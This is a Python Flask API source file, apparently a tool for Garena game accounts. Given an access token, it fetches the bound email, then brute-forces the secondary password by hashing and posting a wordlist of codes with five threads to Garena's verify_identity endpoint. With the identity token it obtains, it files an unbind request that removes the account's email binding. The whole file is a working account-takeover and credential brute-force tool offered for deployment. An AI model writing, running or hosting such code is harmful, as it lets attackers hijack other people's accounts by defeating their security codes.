# app.py - Complete Flask API for Render (DRK Auto-Bind Tool)
import os
import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, jsonify, request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "message": "DRK Auto-Bind API is running successfully on Render!",
        "endpoint": "/unbind?access_token=YOUR_ACCESS_TOKEN"
    })

@app.route('/unbind', methods=['GET', 'POST'])
def unbind_api():
    # Support both GET query parameters and POST json/form data
    if request.method == 'POST':
        data = request.get_json() or request.form
        access_token = data.get('access_token')
    else:
        access_token = request.args.get('access_token')

    if not access_token:
        return jsonify({
            "success": False,
            "error": "Access token is missing! Provide it via ?access_token=..."
        }), 400

    if not os.path.exists("HLO.txt"):
        return jsonify({
            "success": False,
            "error": "'HLO.txt' file not found on the server deployment!"
        }), 500

    # Step 1: Fetch Bound Email automatically
    try:
        url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        info_payload = {'app_id': "100067", 'access_token': access_token}
        info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=20)
        res_json = r_info.json()
        email = res_json.get("email", "")
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Error connecting to Garena: {str(e)}"
        }), 502

    if not email:
        return jsonify({
            "success": False,
            "error": "No bound email found or invalid access token provided.",
            "garena_response": res_json
        }), 400

    # Step 2: Read codes from HLO.txt and multi-thread attack
    try:
        with open("HLO.txt", "r") as f:
            codes = [line.strip() for line in f if line.strip()]
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Failed to read HLO.txt: {str(e)}"
        }), 500

    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }

    def test_single_code(code):
        hashed_sec_code = hashlib.sha256(code.encode('utf-8')).hexdigest()
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email, 
            "app_id": "100067", 
            "access_token": access_token, 
            "secondary_password": hashed_sec_code
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=8)
            res_json = resp.json()
            if "identity_token" in res_json and res_json.get("identity_token"):
                return code, res_json.get("identity_token")
        except Exception:
            pass
        return None, None

    identity_token = None
    matched_code = None

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_single_code, code): code for code in codes}
        
        for future in as_completed(futures):
            code, token = future.result()
            if token:
                matched_code = code
                identity_token = token
                for f in futures:
                    f.cancel()
                break

    if not identity_token or not matched_code:
        return jsonify({
            "success": False,
            "email": email,
            "error": "Identity verification failed! No code matched from HLO.txt."
        }), 404

    # Step 3: Send final Unbind Request
    unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    unbind_data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
    
    try:
        final_resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=10)
        server_response = final_resp.text
    except Exception as e:
        server_response = f"Request failed: {str(e)}"

    return jsonify({
        "success": True,
        "email": email,
        "matched_code": matched_code,
        "identity_token": identity_token,
        "server_response": server_response
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
          
